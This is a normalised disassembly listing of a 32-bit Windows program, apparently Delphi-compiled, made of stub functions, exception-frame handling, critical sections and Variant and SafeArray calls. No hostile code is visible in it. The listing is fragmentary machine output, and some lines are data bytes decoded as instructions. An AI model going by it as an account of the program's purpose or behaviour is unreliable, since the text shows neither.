retn
call sub_40c048
mov ecx eax
sub_40c2d0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c2f0
push eax
call CharNextA
retn
sub_40c514
jmp sub_4038f0
sub_40c51b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c584
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c9db
jmp sub_4038f0
sub_40c9e2
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ Sleep@IAT ]
sub_40cb20
jmp sub_4038f0
sub_40cb27
pop ebx
mov esp ebp
pop ebp
retn
sub_40cb2c
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ca90
sub_40cb3c
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cb58
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402714
pop ebx
retn
sub_40cbe0
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cbec
xchg [ eax ] edx
mov eax edx
retn
sub_40cc4c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ccdc
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cdf4
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40ce1c
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d097
jmp sub_4038f0
sub_40d09e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d10c
jmp sub_4038f0
sub_40d113
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d131
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d12a
jmp sub_4038f0
sub_40d131
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d581
jmp sub_4038f0
sub_40d588
pop ebp
retn
sub_40d5f4
jmp sub_4038f0
sub_40d5fb
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d674
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d6da
jmp sub_4038f0
sub_40d6e1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d746
jmp sub_4038f0
sub_40d74d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d7b2
jmp sub_4038f0
sub_40d7b9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d81e
jmp sub_4038f0
sub_40d825
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d88a
jmp sub_4038f0
sub_40d891
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d909
jmp sub_4038f0
sub_40d910
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d97c
jmp sub_4038f0
sub_40d983
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d9ec
jmp sub_4038f0
sub_40d9f3
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da60
jmp sub_4038f0
sub_40da67
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40dded
jmp sub_4038f0
sub_40ddf4
pop ebp
retn
sub_40ddf8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dabc
sub_40de09
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e492
jmp sub_4038f0
sub_40e499
pop ecx
pop ebp
retn
sub_40e52b
jmp sub_4038f0
sub_40e532
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e582
jmp sub_4038f0
sub_40e589
pop ecx
pop ebp
retn
sub_40e5d6
jmp sub_4038f0
sub_40e5dd
pop ecx
pop ebp
retn
sub_40e66f
jmp sub_4038f0
sub_40e676
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6c6
jmp sub_4038f0
sub_40e6cd
pop ecx
pop ebp
retn
sub_40e915
jmp sub_4038f0
sub_40e91c
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea32
jmp sub_4038f0
sub_40ea39
pop ecx
pop ebp
retn
sub_40ea3c
push ebx
mov ebx eax
mov eax ebx
call sub_40ecd4
mov [ ebx ] 0x1
pop ebx
retn
sub_40ece8
push eax
call sub_40ecd4
pop eax
retn
sub_40ef48
call sub_40effc
retn
sub_40f09c
jmp sub_4038f0
sub_40f0a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f0ea
jmp sub_4038f0
sub_40f0f1
pop ebx
pop ecx
pop ebp
retn
sub_40f136
jmp sub_4038f0
sub_40f13d
pop ebx
pop ecx
pop ebp
retn
sub_40f182
jmp sub_4038f0
sub_40f189
pop ebx
pop ecx
pop ebp
retn
sub_40f1ce
jmp sub_4038f0
sub_40f1d5
pop ebx
pop ecx
pop ebp
retn
sub_40f597
jmp sub_4038f0
sub_40f59e
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f638
jmp sub_4038f0
sub_40f63f
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40faad
jmp sub_40363c
sub_40fb68
jmp sub_40363c
sub_40fc0f
jmp sub_40363c
sub_40fd08
jmp sub_40363c
sub_40fde1
jmp sub_40363c
sub_40fec9
jmp sub_40363c
sub_410086
jmp sub_4038f0
sub_41008d
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4100ef
jmp sub_4038f0
sub_4100f6
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41055c
jmp sub_40363c
sub_41064b
jmp sub_4038f0
sub_410652
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4106f0
jmp sub_4038f0
sub_4106f7
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410a94
call sub_41074c
neg al
sbb eax eax
neg eax
retn
sub_410b55
jmp sub_4038f0
sub_410b5c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c05
jmp sub_4038f0
sub_410c0c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41115d
jmp sub_40363c
sub_411264
jmp sub_4038f0
sub_41126b
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411375
jmp sub_4038f0
sub_41137c
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4117cc
jmp sub_4038f0
sub_4117d3
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4118dd
jmp sub_4038f0
sub_4118e4
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411a1d
add al [ eax ]
add [ ebx - 0x1ea173d ] cl
sub_411e2a
jmp sub_4038f0
sub_411e31
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411ed5
jmp sub_4038f0
sub_411edc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411efe
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045e4
retn
sub_411ef7
jmp sub_4038f0
sub_411efe
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f5a
jmp sub_4038f0
sub_411f61
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411fdd
jmp sub_4038f0
sub_412523
jmp sub_4038f0
sub_41252a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4125bd
jmp sub_4038f0
sub_4125c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4125e1
lea eax [ ebp - 0x14 ]
call sub_4045cc
retn
sub_4125da
jmp sub_4038f0
sub_4125e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41263e
jmp sub_4038f0
sub_412645
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126e7
jmp sub_4038f0
sub_412704
jmp sub_4038f0
sub_41270b
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412c66
jmp sub_4038f0
sub_412c6d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412cde
jmp sub_4038f0
sub_412ce5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413070
push eax
call sub_40ecd4
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_413084
push eax
call sub_40ecd4
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_41320f
jmp sub_4038f0
sub_41323b
jmp sub_4038f0
sub_413242
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41346f
jmp sub_4038f0
sub_413476
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_413717
jmp sub_4038f0
sub_4137a5
jmp sub_4038f0
sub_413895
jmp sub_4038f0
sub_413937
jmp sub_4038f0
sub_4139ed
jmp sub_4038f0
sub_413a94
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40effc
add esp 0x10
sub_413d3e
jmp sub_4038f0
sub_413d45
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413d88
mov ax [ eax ]
retn
sub_413e88
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ecd4
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413ea0
mov edx 0x80020004
call sub_413e88
retn
sub_413ef0
mov dl 0x1
call sub_413ef8
retn
sub_413fa5
jmp sub_4038f0
sub_413fac
pop esi
pop ebx
pop ebp
retn
sub_413fb0
push ebp
mov ebp esp
call sub_414170
pop ebp
retn 0x4
sub_41403c
push ebp
mov ebp esp
call sub_414170
pop ebp
retn 0x4
sub_41411f
jmp sub_4038f0
sub_414126
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403164
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403510
sub_414148
xor eax eax
retn
sub_41414c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414160
mov [ ecx ] 0x8
mov al 0x1
retn
sub_414168
call sub_40e448
retn
sub_414170
call sub_40e538
retn
sub_414178
call sub_40e9e8
retn
sub_414180
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_414194
call sub_414170
retn
sub_41419c
push ebp
mov ebp esp
call sub_414178
pop ebp
retn 0x8
sub_4141b4
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_414290
jmp sub_4038f0
sub_414359
jmp sub_4038f0
sub_414360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41437d
lea eax [ ebp - 0x10 ]
call sub_403eec
retn
sub_414376
jmp sub_4038f0
sub_41437d
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414388
call sub_40ea3c
retn
sub_414390
mov ecx 0xe
call sub_413a2c
cmp al 0x1
retn
sub_41440f
jmp sub_4038f0
sub_414416
pop ebp
retn
sub_4144b9
jmp sub_4038f0
sub_4144c0
pop ebp
retn
sub_4145d9
jmp sub_4038f0
sub_4145e0
pop ebp
retn
sub_4145e4
sub [ rw-data ] 0x1
retn
sub_4146e2
jmp sub_4038f0
sub_4146e9
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414a08
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414970
mov eax ebx
mov edx esp
call sub_404150
add esp 0x100
pop ebx
retn
sub_414a64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f40
pop esi
pop ebx
retn
sub_414b40
jmp sub_4038f0
sub_414b47
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b98
jmp sub_4038f0
sub_414b9f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414cec
jmp sub_4038f0
sub_414cf3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414dc2
jmp sub_4038f0
sub_414dc9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4150e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40effc
pop esi
pop ebx
retn
sub_41538a
jmp sub_4038f0
sub_415391
pop ebp
retn
sub_415394
sub [ rw-data ] 0x1
retn
sub_4153c1
jmp sub_4038f0
sub_4153c8
pop ebp
retn
sub_4153cc
sub [ rw-data ] 0x1
retn
sub_415e84
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_4164a1
add [ esp + 0x4 ] 0xffffffec
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x8 ]
sub_416c40
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416cb4
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_416d80
mov eax [ eax + 0xc ]
call sub_41814c
retn
sub_417057
jmp sub_4038f0
sub_41705e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417064
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_418304
test eax eax
setge al
pop esi
pop ebx
retn
sub_417367
jmp sub_4038f0
sub_41736e
mov esp ebp
pop ebp
retn
sub_41743c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_417448
push ebx
mov ebx edx
mov edx ebx
call sub_41725c
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_416fbc
sub_4174f4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41764f
jmp sub_4038f0
sub_417723
jmp sub_4038f0
sub_417734
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_4177a0
jmp sub_4038f0
sub_4177a7
pop ebx
mov esp ebp
pop ebp
retn
sub_4177f2
jmp sub_4038f0
sub_4177f9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417885
jmp sub_4038f0
sub_41788c
pop ebx
pop ebp
retn
sub_4178d2
jmp sub_4038f0
sub_4178d9
pop ebx
pop ebp
retn
sub_41791e
jmp sub_4038f0
sub_417925
pop ebx
pop ebp
retn
sub_41796f
jmp sub_4038f0
sub_417976
pop esi
pop ebx
pop ebp
retn
sub_4179ca
jmp sub_4038f0
sub_4179d1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417afe
jmp sub_4038f0
sub_417b7a
jmp sub_4038f0
sub_417c50
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_418444
sub_417d40
jmp sub_4038f0
sub_417eca
jmp sub_4038f0
sub_417ed1
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417f6b
jmp sub_4038f0
sub_417f72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f91
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_417f8a
jmp sub_4038f0
sub_417f91
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_417ffd
jmp sub_4038f0
sub_418004
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4180fc
jmp sub_4038f0
sub_418103
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403174
retn
sub_418119
jmp sub_4038f0
sub_418180
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4184a0
xor edx edx
mov eax ebx
call sub_418464
pop ebx
retn
sub_4181f8
mov eax [ ebp + 0x4 ]
retn
sub_41822e
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41827c
jmp sub_4038f0
sub_418283
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418288
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4182a0
xor edx edx
call sub_4182a8
retn
sub_418390
mov edx [ eax + 0x8 ]
dec edx
call sub_4182a8
retn
sub_418510
retn
sub_41870e
jmp sub_4038f0
sub_4187ce
jmp sub_4038f0
sub_418896
jmp sub_4038f0
sub_41889d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403510
sub_41892c
jmp sub_4038f0
sub_418933
pop ebx
pop ecx
pop ebp
retn
sub_418938
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41898f
jmp sub_4038f0
sub_418996
pop ebx
pop ecx
pop ebp
retn
sub_41899c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4189d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
retn
sub_4189f0
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418acb
retn
sub_418b70
test edx edx
je r-xdata
xor edx edx
call sub_418b84
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418c3a
jmp sub_4038f0
sub_418c41
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c54
xchg edx eax
call sub_418b84
retn
sub_418c5c
retn
sub_418cf5
jmp sub_4038f0
sub_418cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418eb9
jmp sub_4038f0
sub_418ec0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418f54
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
mov edx [ edx + 0x8 ]
xchg edx eax
call sub_418304
retn
sub_419029
jmp sub_4038f0
sub_419030
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419074
xor edx edx
call sub_418f30
retn
sub_4191e2
jmp sub_4038f0
sub_4191fc
inc [ eax + 0xc ]
retn
sub_419200
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_41926a
jmp sub_4038f0
sub_419278
dec [ eax + 0xc ]
call sub_419200
retn
sub_4192b4
xor eax eax
retn
sub_4192b8
push ebx
mov ebx ecx
mov eax ebx
call sub_403eec
pop ebx
retn
sub_4192ec
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4182a8
pop esi
pop ebx
retn
sub_4193ae
jmp sub_4038f0
sub_4193b5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194c5
jmp sub_4038f0
sub_4195a0
retn
sub_4195a4
retn
sub_4195a8
retn
sub_4195ac
retn
sub_4196d6
jmp sub_4038f0
sub_4196dd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196fa
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_4196f3
jmp sub_4038f0
sub_4196fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419784
jmp sub_4038f0
sub_41979c
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419858
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419901
jmp sub_4038f0
sub_419908
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419914
mov eax [ ebp + 0x4 ]
retn
sub_41994a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419998
jmp sub_4038f0
sub_41999f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419a5e
jmp sub_4038f0
sub_419a65
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a87
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f10
retn
sub_419a80
jmp sub_4038f0
sub_419a87
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419a90
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419a98
xor eax eax
retn
sub_419ae1
jmp sub_4038f0
sub_419ae8
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419bfb
jmp sub_4038f0
sub_419c02
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419c97
jmp sub_4038f0
sub_419c9e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d1c
jmp sub_4038f0
sub_419d23
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419df3
jmp sub_4038f0
sub_419dfa
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419eb0
jmp sub_4038f0
sub_419eb7
pop esi
pop ecx
pop ebp
retn
sub_419f3c
jmp sub_4038f0
sub_419f43
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f60
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_419f59
jmp sub_4038f0
sub_419f60
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419fec
jmp sub_4038f0
sub_41a009
jmp sub_4038f0
sub_41a010
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a04c
retn
sub_41a0cf
jmp sub_4038f0
sub_41a0d6
mov eax [ ebp - 0x8 ]
call sub_41cd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0fb
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_41a0f4
jmp sub_4038f0
sub_41a0fb
mov esp ebp
pop ebp
retn
sub_41a14b
jmp sub_4038f0
sub_41a152
pop esi
pop ecx
pop ebp
retn
sub_41a1a5
jmp sub_4038f0
sub_41a1ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a1b4
retn
sub_41a22f
jmp sub_4038f0
sub_41a236
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a2d3
jmp sub_4038f0
sub_41a2da
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a2f7
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_41a2f0
jmp sub_4038f0
sub_41a2f7
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a2fc
retn
sub_41a39c
jmp sub_4038f0
sub_41a3a3
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a422
jmp sub_4038f0
sub_41a429
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a430
mov eax edx
mov edx ecx
call sub_407e10
retn
sub_41a43c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a454
sub_41a4cc
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a53c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a558
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a74c
mov eax [ eax + 0x18 ]
retn
sub_41a750
mov eax [ eax + 0x14 ]
retn
sub_41a7ec
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_402734
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41aa34
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41aa4c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41aa60
mov edx sub_41aa4c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41aaa8
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407e10
retn
mov eax edx
mov edx ecx
call sub_407dd8
retn
sub_41ab44
retn
sub_41ae3c
jmp sub_4038f0
sub_41ae43
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41aea4
jmp sub_4038f0
sub_41aeab
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aef0
mov eax [ eax + 0x4 ]
call sub_408388
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41af00
mov eax [ eax + 0x4 ]
call sub_4083b4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41af3c
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b0e5
jmp sub_4038f0
sub_41b144
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b1d4
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b224
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b45f
jmp sub_4038f0
sub_41b466
mov esp ebp
pop ebp
retn
sub_41b510
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
retn
sub_41b598
mov [ eax + 0x18 ] edx
retn
sub_41b714
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_414914
retn
sub_41b79b
jmp sub_4038f0
sub_41b7a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b84e
jmp sub_4038f0
sub_41b855
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b9f9
jmp sub_4038f0
sub_41ba4b
jmp sub_4038f0
sub_41ba6a
jmp sub_4038f0
sub_41ba71
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba90
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41ba89
jmp sub_4038f0
sub_41ba90
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41bb33
jmp sub_4038f0
sub_41bbbb
jmp sub_4038f0
sub_41bbc8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
pop ebx
retn
sub_41bbe0
mov eax [ rw-data ]
call sub_41bbc8
retn
sub_41bc18
push ebx
call sub_414748
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_41bbe0
sub_41bd85
jmp sub_4038f0
sub_41bd8c
mov eax [ ebp - 0x4 ]
add eax 0x70
call sub_403eec
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_41beac
jmp sub_4038f0
sub_41beb3
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bfaa
jmp sub_4038f0
sub_41bfc7
